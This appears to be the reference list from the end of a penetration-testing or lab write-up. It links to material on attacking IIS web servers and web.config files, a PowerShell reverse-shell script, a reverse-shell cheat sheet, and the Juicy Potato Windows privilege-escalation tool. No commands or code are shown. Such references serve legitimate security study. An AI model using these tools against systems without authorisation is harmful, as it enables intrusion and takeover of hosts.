* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
* https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/
* https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
* https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
* https://github.com/ohpe/juicy-potato/releases/tag/v0.1
* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
* https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/

# FIN
